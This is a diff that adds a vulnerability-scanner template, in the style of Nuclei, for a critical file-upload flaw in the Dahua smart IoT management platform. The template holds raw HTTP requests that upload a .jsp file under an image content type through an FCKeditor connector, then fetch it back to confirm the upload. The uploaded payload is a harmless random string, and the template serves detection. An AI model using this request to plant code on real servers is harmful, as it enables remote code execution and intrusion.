@@ -1,0 +1,47 @@
+id: Donghuayl-connector-fileupload
+
+info: 
+  name: Donghuayl-connector-fileupload
+  author: fitz
+  severity: critical
+  description: |-
+    大华智能物联综合管理平台存在文件上传漏洞，攻击者可以利用该漏洞上传恶意文件，进而执行任意代码。
+  reference:
+    - 
+  tags: File Upload
+  
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+  suijizifu: "{{to_lower(rand_base(12))}}"
+
+http:
+  - raw:
+    - |
+      POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Connection: close
+      Content-Length: 292
+
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="NewFile"; filename="{{filename}}.jsp"
+      Content-Type: image/jpeg
+
+      {{suijizifu}}
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="Submit"
+
+      upload
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
+
+    - |
+      GET /common/FCKeditor/UserFiles/{{filename}}.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"{{suijizifu}}")
